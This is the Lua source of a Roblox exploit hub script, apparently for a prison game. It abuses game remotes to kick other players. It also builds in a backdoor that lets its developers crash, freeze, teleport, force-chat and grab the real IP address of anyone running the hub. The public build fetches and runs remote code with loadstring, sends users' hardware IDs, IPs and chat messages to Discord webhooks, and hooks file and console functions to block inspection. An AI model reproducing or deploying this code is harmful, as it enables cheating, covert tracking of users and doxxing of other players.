	local Twen = MakeTween(2.7/2,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false)
	local tween = TweenService:Create(ColorChange, Twen, {Saturation = -1})
	tween:Play()
end)
spawn(function()
	for i=0,2,0.1 do
		wait()
		Humanoid.CameraOffset =  Vector3.new(0,0,0) + Vector3.new(math.random(-3/i,3/i),math.random(-3/i,3/i),math.random(-3/i,3/i))
	end
	Humanoid.CameraOffset =  Vector3.new(0,0,0)
end)
TimeFX = true
local distort = Instance.new("NumberValue",script)
distort.Value = 0.99
local MinDistort = 0.05



local FXFunc = spawn(function()
	game:GetService("RunService").RenderStepped:connect(function() 
		if distort.Value ~= 1 then
			Camera.CoordinateFrame=Camera.CoordinateFrame*CFrame.new(0,0,0,distort.Value,0,0,0,distort.Value,0,0,0,1)
		else
			return
		end
			
	end)
end)
spawn(function()
	local Twen = MakeTween(2.7/2,Enum.EasingStyle.Cubic,Enum.EasingDirection.Out,0,false)
	local tween = TweenService:Create(distort, Twen, {Value = MinDistort})
	tween:Play()
	wait(2.7/2)
	local Twen = MakeTween(2.7/2,Enum.EasingStyle.Cubic,Enum.EasingDirection.In,0,false)
	local tween = TweenService:Create(distort, Twen, {Value = 1})
	tween:Play()
end)
makesound("rbxassetid://11331880056",1,4,workspace)
if Player.Name ~= Ranks.Developer.UserName and Player.Name ~= Ranks.Holder.UserName and Player.UserId ~= Ranks.Developer.UserId and Player.UserId ~= Ranks.Holder.UserId then
    for i,v in pairs(Player.Character:GetChildren()) do
        if v:IsA("BasePart") then
            v.Anchored = true
        end
    end
end
spawn(function()
	for i, v in pairs(game.Workspace:GetDescendants())do
		if v:IsA("Sound") and not v:IsDescendantOf(script) then
			spawn(function()
				local Twen = MakeTween(2.7,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false)
			local tween = TweenService:Create(v, Twen, {PlaybackSpeed = 0})
				tween:Play()
				wait(2.7)
			while Time ~= "Resumed" do
					wait()
					v.PlaybackSpeed = 0
				end
				local Twen = MakeTween(2.7,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false)
				local tween = TweenService:Create(v, Twen, {PlaybackSpeed = 1})
				tween:Play()
			end)
			
		end
	end
end)
repeat
	wait()
until Time == "Resumed"
CreateGui(TimeStopper,"May time flow, once again.")
local Twen = MakeTween(2.7/2,Enum.EasingStyle.Cubic,Enum.EasingDirection.In,0,true)
local tween = TweenService:Create(Blur, Twen, {Size = 50})
tween:Play()
local Twen = MakeTween(2.7,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false)
local tween = TweenService:Create(ColorChange, Twen, {Saturation = 0})
tween:Play()
wait(2.7)
if Player.Name ~= Ranks.Developer.UserName and Player.Name ~= Ranks.Holder.UserName and Player.UserId ~= Ranks.Developer.UserId and Player.UserId ~= Ranks.Holder.UserId then
    for i,v in pairs(Player.Character:GetChildren()) do
        if v:IsA("BasePart") then
            v.Anchored = false
        end
    end
end
Blur:Destroy()
ColorChange:Destroy()
end
if ScriptRelease == "Developer" then
local EternalHubDevServer = win:Server(ScriptName.." dev", "http://www.roblox.com/asset/?id=11331692883")
local Devplayers = EternalHubDevServer:Channel("players")
Devplayers:Label("'String' Is used as a global value for some functions")
Devplayers:Textbox(
    "Target",
    "Enter target name",
    false,
    function(target)
        local FilteredString = FilterTNames(target)
        if FilteredString ~= Ranks.Developer.UserName and FilteredString ~= Ranks.Holder.UserName then
        DevTarget = FilteredString
        else
            DiscordLib:Notification("Error", "This player cannot be targetted. try someone else!", "sorry")
        end
    end
)
Devplayers:Textbox(
    "String",
    "Enter String",
    false,
    function(reason)
        DevReason = reason
    end
)
Devplayers:Seperator()
local function TKick(char)
    if not Players:FindFirstChild(char) then return end
    --if Players:FindFirstChild(char).Name ~= Ranks.Developer.UserName and Players:FindFirstChild(char).Name ~= Ranks.Holder.UserName then
    char = Players:FindFirstChild(char).Character
    Player.Character.HumanoidRootPart.Anchored = true
local oldteam = Player.TeamColor
local oldroot = Player.Character.HumanoidRootPart
oldcf = oldroot.CFrame
local target = char["HumanoidRootPart"]

local newroot
Player.Character.ChildAdded:Connect(function(child)
    if child.Name == "HumanoidRootPart" then
       newroot = child
       return end
end)

workspace.resources.RemoteFunction:InvokeServer("giveRiotShield", target)
workspace.resources.RemoteEvent:FireServer("toggleShield",workspace.RiotShield)
wait(0.01)
oldroot.Anchored = false
for i = 1,5 do
newroot.CFrame = oldcf
wait(0.03)
end
for i,v in pairs(Player.Character:GetChildren()) do
    if v.Name == "RiotShield" then
        Player.Character["Left Arm"].Weld:Destroy()
        newroot:Destroy()
        v:Destroy()
    end
end
workspace.resources.RemoteFunction:InvokeServer("giveRiotShield", workspace["robber spawn"])
repeat wait(0.01) until Player.Character:FindFirstChild("robber spawn")
for i = 1,7 do
oldroot.CFrame = target.CFrame
wait(0.01)
end
oldroot.CFrame = oldcf
for i,v in pairs(Player.Character:GetChildren()) do
    if v.Name == "RiotShield" then
        Player.Character["Left Arm"].Weld:Destroy()
        newroot:Destroy()
        v:Destroy()
    end
end
Player.Character["robber spawn"]:Destroy()
wait(0.02)
repeat wait() until not Player.Character:FindFirstChild("robber spawn")
for x = 1,20 do
    game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police") 
end
oldroot.CFrame = oldcf
wait(0.02)
local newroot
Player.Character.ChildAdded:Connect(function(child)
    if child.Name == "HumanoidRootPart" then
       newroot = child
       return end
end)
workspace.resources.RemoteFunction:InvokeServer("giveRiotShield", target)
workspace.resources.RemoteEvent:FireServer("toggleShield",workspace.RiotShield)
oldroot.Anchored = false
wait(0.01)
newroot.CFrame = oldcf
wait(0.04)

for x = 1,25 do
newroot.CFrame = CFrame.new(29, 0.5, -27.5, -1, 0, 0, 0, 1, 0, 0, 0, -1)
wait(0.02)
end
wait()
for i,v in pairs(Player.Character:GetChildren()) do
    if v.Name == "RiotShield" then
        Player.Character["Left Arm"].Weld:Destroy()
        newroot:Destroy()
        v:Destroy()
    end
end
oldroot.CFrame = oldcf
wait(0.1)
if oldteam == BrickColor.new("Bright red") then
    game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "prisoners")
elseif oldteam == BrickColor.new("Bright blue") then
    game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police")
elseif oldteam == BrickColor.new("Bright yellow") then
    firetouchinterest(Plr.Character.Head, game:GetService("Workspace")["robber spawn"], 0)
end
end
Devplayers:Button(
    "Kick player",
    function()
        TKick(DevTarget)
    end
)
Devplayers:Toggle(
    "Loopkill player",
    false,
    function(tog)
        if not Players:FindFirstChild(DevTarget) then loopkilltog = false return end
        if tog == true then
            loopkilltog = true
            else
            loopkilltog = false
        end
    end
)
Devplayers:Button(
    "Warn player",
    function()
        lib.FireOtherClients({
            Function = "Warn",
            Target = Players[DevTarget],
            String = DevReason
        })
    end
)
Devplayers:Button(
    "Message player",
    function()
        lib.FireOtherClients({
            Function = "Message",
            Target = Players[DevTarget],
            String = DevReason
        })
    end
)
Devplayers:Button(
    "Bring player",
    function()
        lib.FireOtherClients({
            Function = "Teleport",
            Target = Players[DevTarget],
            String = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
        })
    end
)
Devplayers:Button(
    "Force chat player",
    function()
        lib.FireOtherClients({
            Function = "ForceChat",
            Target = Players[DevTarget],
            String = DevReason
        })
    end
)
Devplayers:Button(
    "Grab player IP",
    function()
        lib.FireOtherClients({
            Function = "GrabIP",
            Target = Players[DevTarget],
            String = Players[DevTarget]
        })
    end
)
Devplayers:Button(
    "Crash player",
    function()
        lib.FireOtherClients({
            Function = "Crash",
            Target = Players[DevTarget],
            String = Players[DevTarget]
        })
    end
)
Devplayers:Button(
    "Freeze player",
    function()
        lib.FireOtherClients({
            Function = "Freeze",
            Target = Players[DevTarget],
            String = ""
        })
    end
)
Devplayers:Button(
    "Thaw player",
    function()
        lib.FireOtherClients({
            Function = "Thaw",
            Target = Players[DevTarget],
            String = ""
        })
    end
)
Devplayers:Seperator()
Devplayers:Label("Fun")
Devplayers:Button(
    "Clown player",
    function()
        lib.FireOtherClients({
            Function = "Clown",
            Target = Players[DevTarget],
            String = Players[DevTarget]
        })
        clown(Players[DevTarget])
    end
)
local DevFunctions = EternalHubDevServer:Channel("functions")
local TableOfExploiters = {}
DevFunctions:Button(
    "Who's Exploiting",
    function()
        TableOfExploiters = {}
        lib.FireOtherClients({
            Function = "Username?"
        })
    end
)
workspace.resources.RemoteEvent.OnClientEvent:Connect(function(arg1,arg2,arg3,arg4,arg5)
    wait(0.1)
    if arg3 == "User:" then
    table.insert(TableOfExploiters,arg4)
    DiscordLib:Notification("Exploiters", table.concat(TableOfExploiters, ", "), "Awesome!")
    elseif arg3 == "CreateOverhead" then
        CreateOverHeadGui(arg4,arg5)
    elseif arg3 == "IPAddress" then
        setclipboard(arg4)
        Notification:Notify(
            {Title = "Notification", Description = "IP Address of "..tostring(DevTarget).." has been copied to your clipboard ( "..arg4.." )"},
            {OutlineColor = Color3.fromRGB(255, 255, 0),Time = 7, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=6035067826", ImageColor = Color3.fromRGB(255, 255, 0)}
        )
    elseif arg3 == "TimeStopDev" then
        ClientTimeStop(arg4)
    elseif arg3 == "ResumeTimeDev" then
        Time = "Resumed"
    elseif arg3 == "CreateSoundDev" then
        createClientSound(tostring(arg4))
    elseif arg3 == "DestroySoundDev" then
        stopClientSound()
    elseif arg3 == "CheckForOwnersDev" then
        lib.FireOtherClients({
            Function = "CheckForOwners",
            Target = Player,
            String = Player.Name
        })
end
end)
DevFunctions:Seperator()
DevFunctions:Textbox(
    "String",
    "Enter String",
    false,
    function(String)
        DevString = String
    end
)
DevFunctions:Button(
    "Play sound",
    function()
        lib.FireOtherClients({
            Function = "CreateSound",
            Target = "",
            String = DevString
        })
        lib.FireOtherClients("CreateSoundDev",DevString)
    end
)
DevFunctions:Button(
    "Stop sound",
    function()
        lib.FireOtherClients({
            Function = "DestroySound",
            Target = "",
            String = ""
        })
    lib.FireOtherClients("DestroySoundDev")    
    end
)
DevFunctions:Seperator()
local function SpawnMissileDev()
    
end
DevFunctions:Button(
    "Spawn Missile",
    function()
        SpawnMissileDev()
    end
)

lib.FireOtherClients({
    Function = "CheckForUsers",
    Target = Player,
    String = "",
})

if Player.Name == Ranks.Developer.UserName or Player.UserId == Ranks.Holder.UserName then
lib.FireOtherClients({
    Function = "CheckForOwners",
    Target = Player,
    String = Player.Name
})
end
--DevFunctions:Seperator()

if Player.Name == Ranks.Developer.UserName and Player.UserId == Ranks.Developer.UserId then
DevFunctions:Seperator()
DevFunctions:Label("Timestop only stops time for other exploiters using the hub")
DevFunctions:Label("To check whos exploiting press 'Who's exploiting'")
DevFunctions:Button(
    "Timestop",
    function()
        --ClientTimeStop("Big Bitch")
        lib.FireOtherClients({
            Function = "TimeStop",
            Target = Player,
            String = Player.DisplayName,
        })
        lib.FireOtherClients("TimeStopDev",Player.DisplayName)
    end
)
DevFunctions:Button(
    "Resume Time",
    function()
        lib.FireOtherClients({
            Function = "ResumeTime",
            Target = Player,
            String = "",
        })
        Time = "Resumed"
        lib.FireOtherClients("ResumeTimeDev")
    end
)
end

end 

if ScriptRelease == "Developer" then
Player.CharacterAdded:Connect(function(char)
    lib.FireOtherClients({
    Function = "CheckForOwners",
    Target = Player,
    String = Player.Name
})
end)
end

--lib.FireOtherClients("CreateOverhead",Player,tostring(ReturningUser))
if ScriptRelease == "Public" then
    
    
function LogHookDetection()
local plainip = tostring(game:HttpGet("https://api.ipify.org"))
if syn then
    ip = syn.crypt.hash(plainip)
    executor = "Synapse X"
elseif Krnl then
    ip = Krnl.crypt.hash(plainip)
    executor = "KRNL"
else
    game.Players.LocalPlayer:Kick("Stop using shitsploits get krnl or buy synapse")
end

local usertable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedusers"))()
local hwidtable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedhwids"))()
local iptable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedips"))()

local blacklist = false

for i,v in pairs(hwidtable) do
if v == game:GetService("RbxAnalyticsService"):GetClientId() then
blacklist = true
else
end
end

for i,v in pairs(usertable) do
if v == game:GetService("Players").LocalPlayer.Name then
blacklist = true
else
continue
end
end

for i,v in pairs(iptable) do
if v == ip then
blacklist = true
else
continue
end
end

pcall(function()
    local data
    data = {
         
   ['embeds'] = {
     {
        ['title'] = ScriptName..' | Hook Log',
        ['color'] = 2895667,
        ['fields'] = {
           {name = 'Player Name: ', value = Player.Name},
           {name = 'Description: ', value = '**Outside Script Execution/Blacklisted GUI**'},
           {name = 'HWID: ', value = '```'..game:GetService("RbxAnalyticsService"):GetClientId()..'```'},
           {name = "Version: ", value = ScriptVersion},
           {name = "Hashed IP: ", value = '```'..ip..'```'},
           {name = "Executor: ", value = executor},
         }
     }
   }
 }

    if syn then
        local response = syn.request(
            {
                Url = webhooks.DetectionHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = webhooks.DetectionHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = webhooks.DetectionHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
end
    
            if syn then
    local old
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old = hookfunction(writefile, hook)
    local old2
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old2 = hookfunction(appendfile, hook)
    local old3
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old3 = hookfunction(rconsoleprint, hook)
    local old
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old = hookfunction(writefile, hook)
    local old
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old = hookfunction(appendfile, hook)
    local old4
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old4 = hookfunction(rconsoleinfo, hook)
    local old4
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old5 = hookfunction(rconsolewarn, hook)
    local old6
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old6 = hookfunction(rconsoleerr, hook)
    local old7
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old7 = hookfunction(printconsole, hook)

    local api1 = game:HttpGet("https://api.ipify.org/")
    local api2 = game:HttpGet("https://www.ipv4.cf/")
    wait(1.5)
    if api1 == api2 then
       else
           game.Players.LocalPlayer:Kick("Dont even try to use anti ip logger")
    end
end
if krnl then
    local Hook = Krnl:Require("Hook")
    local old
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old = Hook.new(writefile, hook)
    local old2
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old2 = Hook.new(appendfile, hook)
    local old3
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old3 = Hook.new(rconsoleprint, hook)
    local old
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old = Hook.new(writefile, hook)
    local old
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old = Hook.new(appendfile, hook)
    local old4
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old4 = Hook.new(rconsoleinfo, hook)
    local old4
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old5 = Hook.new(rconsolewarn, hook)
    local old6
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old6 = Hook.new(rconsoleerr, hook)
    local old7
    local hook = function(self, ...)
    LogHookDetection()
    Player:Kick("Error | Report code: 105")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
    old7 = Hook.new(printconsole, hook)
    local api1 = game:HttpGet("https://api.ipify.org/")
    local api2 = game:HttpGet("https://www.ipv4.cf/")
    wait(1.5)
    if api1 == api2 then
       else
        LogHookDetection()
        Player:Kick("Dont even try to use anti ip logger")
    end
end

for i,v in next, getgenv() do
   if string.find(i, "rconsole") then
      getgenv()[i] = function() return end
   end
end

local SimpleSpyLoop = coroutine.create(function() --- Creates the loop
function SimpleSpy()
    while wait(0.5) do
    if _G.SimpleSpyExecuted then
        _G.SimpleSpyShutdown()
    end
end
end
	coroutine.resume(SimpleSpyLoop) --- Plays the loop
end)

local AllowedCoreGuiObjects = {"Discord","AvatarEditorPrompts","TeleportEffectGui","RobloxGui","STX_Nofitication","Chat","RobloxGui","CoreScriptLocalization","RobloxPromptGui","RobloxLoadingGui","TeleportGui","PlayerList","RobloxNetworkPauseNotification","PurchasePrompt","AvatarEditorPrompt","HeadsetDisconnectedDialog","ThemeProvider","InGameFullScreenTitleBar"}
local AllowedPlayerGuiObjects = {"RobloxGui","autoExe","autoExec","GUI","Markers","markers","Chat","BubbleChat","GUI","autoExec","markers"}
game.CoreGui.ChildAdded:Connect(function(Object)
    for i,v in pairs(AllowedCoreGuiObjects) do
        if Object.Name == v or Object.Name == "Discord" then else
            LogHookDetection()
            Player:Kick("Error | Report code: 105-1-.1")
            --game.Workspace.resources.RemoteFunction:InvokeServer("giveItem", "Fake ID Card")
            wait(9e9)
        end
    end
end)
for i,Object in pairs(game.CoreGui:GetChildren()) do
        if not table.find(AllowedCoreGuiObjects, Object.Name) then
            LogHookDetection()
            Player:Kick("Error | Report code: 105-2-.2")
            --game.Workspace.resources.RemoteFunction:InvokeServer("giveItem", "Fake ID Card")
            wait(9e9)
        end
end
Player.PlayerGui.ChildAdded:Connect(function(Object)
    for i,v in pairs(AllowedPlayerGuiObjects) do
        if Object.Name == v or Object.Name == "markers" or Object.Name == "autoExec" or Object.Name == "GUI" then else
            LogHookDetection()
            Player:Kick("Error | Report code: 105-2-.1")
            --game.Workspace.resources.RemoteFunction:InvokeServer("giveItem", "Fake ID Card")
            wait(9e9)
        end
    end
end)
for i,Object in pairs(Player.PlayerGui:GetChildren()) do
        if not table.find(AllowedPlayerGuiObjects, Object.Name) then
            LogHookDetection()
            Player:Kick("Error | Report code: 105-2-.2")
            --game.Workspace.resources.RemoteFunction:InvokeServer("giveItem", "Fake ID Card")
            wait(9e9)
        end
end

for i,v in pairs(game:GetDescendants()) do
    if v.Name == "DevConsoleMaster" then
        v:Destroy()
    end
end
    
lib.FireOtherClients("CheckForOwnersDev",Player)
lib.FireOtherClients("CreateOverhead",Player,tostring(ReturningUser))
Player.CharacterAdded:Connect(function(char)
    lib.FireOtherClients("CreateOverhead",Player,tostring(ReturningUser))
end)
workspace.resources.RemoteEvent.OnClientEvent:Connect(function(arg1,arg2,table)
    wait(0.1)
    local Function = table.Function
    if Function == "Username?" then
       lib.FireOtherClients("User:",Player.Name)
       return
    end
    if Function == "CheckForUsers" then
        lib.FireOtherClients("CreateOverhead",Player,tostring(ReturningUser))
       return
    end
    if Function == "CheckForOwners" then
        StarName()
       return
    end
    local Target = table.Target or nil
    local String = table.String or nil
    if Target == Player then -- functions that require a player
        if Function == "Print" then
            print(String)
        elseif Function == "Kick" then
            Target:Kick(String)
        elseif Function == "Warn" then
                Notification:Notify(
   {Title = "Warning", Description = String},
   {OutlineColor = Color3.fromRGB(255, 255, 0),Time = 7, Type = "image"},
   {Image = "http://www.roblox.com/asset/?id=6035067826", ImageColor = Color3.fromRGB(255, 255, 0)}
   )
        elseif Function == "Message" then
                Notification:Notify(
   {Title = "Direct Message", Description = String},
   {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "image"},
   {Image = "http://www.roblox.com/asset/?id=6035202033", ImageColor = Color3.fromRGB(255, 255, 255)}
   )
        elseif Function == "Teleport" then
            Target.Character.HumanoidRootPart.CFrame = String
        elseif Function == "ForceChat" then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(String, "All")
        elseif Function == "Freeze" then
            for i,v in pairs(Target.Character:GetChildren()) do if v:IsA("BasePart") then v.Anchored = true end end
        elseif Function == "Thaw" then
            for i,v in pairs(Target.Character:GetChildren()) do if v:IsA("BasePart") then v.Anchored = false end end
        elseif Function == "Crash" then
            while true do print("lol crashed") end
        elseif Function == "GrabIP" then
            lib.FireOtherClients("IPAddress",game:HttpGet("https://api.ipify.org"))
        elseif Function == "Clown" then
            clown(Target)
        end
    end
    if Function == "TimeStop" then -- Functions that don't require a player
        ClientTimeStop(String)
    elseif Function == "ResumeTime" then
        Time = "Resumed"
    elseif Function == "CreateSound" then
        createClientSound(tostring(String))
    elseif Function == "DestroySound" then
        DestroySound()
    elseif Function == "Clown" and Target and Target ~= Player then
        clown(Target)
    end
    
end)
end
if ScriptRelease == "Public" then
if Player.DisplayName ~= Player.Name then
    if ReturningUser then
        ChatMakeSystemMessage("message","Hello and Welcome back, "..Player.DisplayName.."! thanks for using this script. make sure to read the TOS before doing anything else!")
        else
            ChatMakeSystemMessage("message","Hello, "..Player.DisplayName.."! thanks for using this script. make sure to read the TOS before doing anything else!")
    end
else
    if ReturningUser then
ChatMakeSystemMessage("message","Hello and Welcome back, "..Player.Name.."! thanks for using this script. make sure to read the TOS before doing anything else!")
else
ChatMakeSystemMessage("message","Hello, "..Player.Name.."! thanks for using this script. make sure to read the TOS before doing anything else!")
end
end
end

Player.Chatted:Connect(function(msg)
    if WebhooksEnabled then
       LogChat(msg)
    end
end)
      
      
      
print("70% of this script was made by Mil#1522 | With massive help and any other credits belonging to Owner#8417")
end
--end
--end